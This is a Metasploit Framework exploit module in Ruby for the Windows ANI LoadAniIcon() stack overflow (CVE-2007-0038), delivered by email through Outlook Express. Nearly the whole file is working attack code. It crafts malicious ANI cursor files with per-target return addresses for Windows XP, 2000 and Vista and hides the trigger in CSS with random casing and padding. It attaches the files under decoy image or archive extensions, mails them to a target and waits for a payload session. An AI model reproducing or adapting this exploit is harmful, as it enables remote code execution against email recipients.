##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Email::IE_ANI_CVE_2007_0038 < Msf::Exploit::Remote

	#
	# This module sends email messages via smtp
	#
	include Exploit::Remote::SMTPDeliver

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Windows ANI LoadAniIcon() Chunk Size Stack Overflow (SMTP)',
			'Description'    => %q{
				This module exploits a buffer overflow vulnerability in the 
				LoadAniIcon() function of USER32.dll. The flaw is triggered
				through Outlook Express by using the CURSOR style sheet
				directive to load a malicious .ANI file. 

				This vulnerability was discovered by Alexander Sotirov of Determina
				and was rediscovered, in the wild, by McAfee.  
			},
			'License'        => MSF_LICENSE,
			'Author'         => 
				[ 
					'hdm',   # First version 
					'skape', # Vista support
				],
			'Version'        => '$Revision$',
			'References'     => 
				[
					['CVE', '2007-0038'],
					['CVE', '2007-1765'],
					['BID', '23194'],
					['URL', 'http://www.microsoft.com/technet/security/advisory/935423.mspx'],
					['URL', 'http://www.determina.com/security_center/security_advisories/securityadvisory_0day_032907.asp'],
					['URL', 'http://www.determina.com/security.research/vulnerabilities/ani-header.html'],
				],
			'Stance'         => Msf::Exploit::Stance::Passive,
			'DefaultOptions' =>
				{
					# Cause internet explorer to exit after the code hits
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'       => 1024 + (rand(1000)),
					'MinNops'     => 32,
					'Compat'      => 
						{
							'ConnectionType' => '-bind -find',
						},
					
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[

					#
					# Use multiple cursor URLs to try all targets. This can result in 
					# multiple, sequential sessions
					#
					
					[ 'Automatic', {} ],
					
					#
					# The following targets use call [ebx+4], just like the original exploit
					#
					
					# Partial overwrite doesn't work for Outlook Express
					[ 'Windows XP SP2 user32.dll 5.1.2600.2622', { 'Ret' => 0x25ba, 'Len' => 2 }],
							
					# Should work for all English XP SP2
					[ 'Windows XP SP2 userenv.dll English', { 'Ret' => 0x769fc81a }],
				
					# Should work for English XP SP0/SP1
					[ 'Windows XP SP0/SP1 netui2.dll English', { 'Ret' => 0x71bd0205 }],					
					
					# Should work for English 2000 SP0-SP4+
					[ 'Windows 2000 SP0-SP4 netui2.dll English', { 'Ret' => 0x75116d88 }],					


					#
					# Partial overwrite where 700b is a jmp dword [ebx] ebx points to the start 
					# of the RIFF chunk itself.  The length field of the RIFF chunk
					# tag contains a short jump into an embedded riff chunk that
					# makes a long relative jump into the actual payload.
					#
					[ 'Windows Vista user32.dll 6.0.6000.16386', 
					  { 
					     'Ret'         => 0x700b, 
					     'Len'         => 2,
						  
					     # On Vista, the pages that contain the RIFF are read-only.
					     # In-place decoders cannot be used.
					     'Payload'     => { 'EncoderType' => Msf::Encoder::Type::Raw }
					  } 
					]
				],
			'DisclosureDate' => 'Mar 28 2007',
			'DefaultTarget' => 0))
			
			register_options(
				[
					OptString.new('MAILSUBJECT', [false, "The subject of the sent email"])
				], self.class)	

	end

	def autofilter
		false
	end

	def exploit
		
		exts = ['bmp', 'wav', 'png', 'zip', 'tar']
		
		gext =  exts[rand(exts.length)]
		name = rand_text_alpha(rand(10)+1) + ".#{gext}"
		
		anis = {}
		
		html =
			"<html><head><title>" + 
				rand_text_alphanumeric(rand(128)+4) +
			"</title>" +			
			"</head><body>" + rand_text_alphanumeric(rand(128)+1)


		mytargs = (target.name =~ /Automatic/) ? targets : [target]

		if target.name =~ /Automatic/
			targets.each_index { |i|
				next if not targets[i].ret
				acid = generate_cid
				html << generate_div("cid:#{acid}")

				# Re-generate the payload, using the explicit target
				return if ((p = regenerate_payload(nil, nil, targets[i])) == nil)
				
				# Generate an ANI file for this target
				anis[acid] = generate_ani(p, targets[i])
			}
		else
			acid = generate_cid
			html << generate_div("cid:#{acid}")
			
			# Re-generate the payload, using the explicit target
			return if ((p = regenerate_payload(nil, nil, target)) == nil)
				
			# Generate an ANI file for this target
			anis[acid] = generate_ani(p, target)
		end

		html << "</body></html>"


		msg = Rex::MIME::Message.new
		msg.mime_defaults
		msg.subject = datastore['MAILSUBJECT'] || Rex::Text.rand_text_alpha(rand(32)+1)
		msg.to = datastore['MAILTO']
		msg.from = datastore['MAILFROM']

		msg.add_part(Rex::Text.encode_base64(html, "\r\n"), "text/html", "base64", "inline")
		anis.each_pair do |cid,ani|
			part = msg.add_part_attachment(ani, cid + "." + gext)
			part.header.set("Content-ID", "<"+cid+">")	
		end

		send_message(msg.to_s)		
		
		print_status("Waiting for a payload session (backgrounding)...")
	end

	def generate_cid
		rand_text_alphanumeric(32)+'@'+rand_text_alphanumeric(8)
	end
	
	def generate_div(url)
		"<div style='" +
			generate_css_padding() +
			Rex::Text.to_rand_case("cursor") +
			generate_css_padding() +
			":" +
			generate_css_padding() +
			Rex::Text.to_rand_case("url(") +
			generate_css_padding() +
			"\"#{url}\"" +
			generate_css_padding() +
			");" +
			generate_css_padding() +
			"'>" +
			generate_padding() +
		"</div>"
	end

	def generate_ani(payload, target)
		
		# Build the first ANI header
		anih_a = [
			36,            # DWORD cbSizeof
			rand(128)+16,  # DWORD cFrames
			rand(1024)+1,  # DWORD cSteps
			0,             # DWORD cx,cy  (reserved - 0)
			0,             # DWORD cBitCount, cPlanes (reserved - 0)
			0, 0, 0,       # JIF jifRate
			1              # DWORD flags
		].pack('V9')
		
		anih_b = nil

		if (target.name =~ /Vista/)
			# Vista has ebp=80, eip=84
			anih_b         = rand_text(83)
			anih_b         = Rex::Text.pattern_create(84)

			# Overwrite local counter variable and pointers
			anih_b[68, 12] = [0].pack('V') * 3
		else
			# XP/2K has ebp=76 and eip=80
			anih_b         = rand_text(80)
			anih_b[64, 16] = [0].pack('V') * 4						
		end

		# Overwrite the return with address of a "call ptr [ebx+4]"
		anih_b << [target.ret].pack('V')[0, target['Len'] ? target['Len'] : 4]
			
		# Begin the ANI chunk
		riff = "ACON"

		# Calculate the data offset for the trampoline chunk and add
		# the trampoline chunk if we're attacking Vista
		if target.name =~ /Vista/
			trampoline_doffset = riff.length + 8

			riff << generate_trampoline_riff_chunk
		end
		
		# Insert random RIFF chunks
		0.upto(rand(128)+16) do |i|
			riff << generate_riff_chunk()
		end
		
		# Embed the first ANI header
		riff << "anih" + [anih_a.length].pack('V') + anih_a

		# Insert random RIFF chunks
		0.upto(rand(128)+16) do |i|
			riff << generate_riff_chunk()
		end
		
		# Trigger the return address overwrite
		riff << "anih" + [anih_b.length].pack('V') + anih_b

		# If this is a Vista target, then we need to align the length of the
		# RIFF chunk so that the low order two bytes are equal to a jmp $+0x16
		if target.name =~ /Vista/
			plen  = (riff.length & 0xffff0000) | 0x0eeb
			plen += 0x10000 if (plen - 8) < riff.length
	
			riff << generate_riff_chunk((plen - 8) - riff.length)

			# Replace the operand to the relative jump to point into the actual
			# payload itself which comes after the riff chunk
			riff[trampoline_doffset + 1, 4] = [riff.length - trampoline_doffset - 4].pack('V')
		end

		# Place the RIFF chunk in front and off we go
		ret = "RIFF" + [riff.length].pack('V') + riff

		# We copy the encoded payload to the stack because sometimes the RIFF
		# image is mapped in read-only pages.  This would prevent in-place
		# decoders from working, and we can't have that.
		ret << Rex::Arch::X86.copy_to_stack(payload.encoded.length) 

		# Place the real payload right after it.
		ret << payload.encoded

		ret
		
	end

	# Generates a riff chunk with the first bytes of the data being a relative
	# jump.  This is used to bounce to the actual payload
	def generate_trampoline_riff_chunk
		tag = Rex::Text.to_rand_case(rand_text_alpha(4))
		dat = "\xe9\xff\xff\xff\xff" + rand_text(1) + (rand_text(rand(256)+1) * 2)
		tag +	[dat.length].pack('V') + dat
	end

	def generate_riff_chunk(len = (rand(256)+1) * 2)
		tag = Rex::Text.to_rand_case(rand_text_alpha(4))
		dat = rand_text(len)
		tag + [dat.length].pack('V') + dat
	end
	
	def generate_css_padding
		buf =
			generate_whitespace() + 
			"/*" + 
			generate_whitespace() + 
			generate_padding() + 
			generate_whitespace() + 
			"*/" + 
			generate_whitespace()
	end

	def generate_whitespace
		len = rand(100)+2
		set = "\x09\x20\x0d\x0a"			
		buf = ''

		while (buf.length < len)
			buf << set[rand(set.length)].chr
		end
		buf
	end
	
	def generate_padding
		rand_text_alphanumeric(rand(128)+4)
	end

end

end

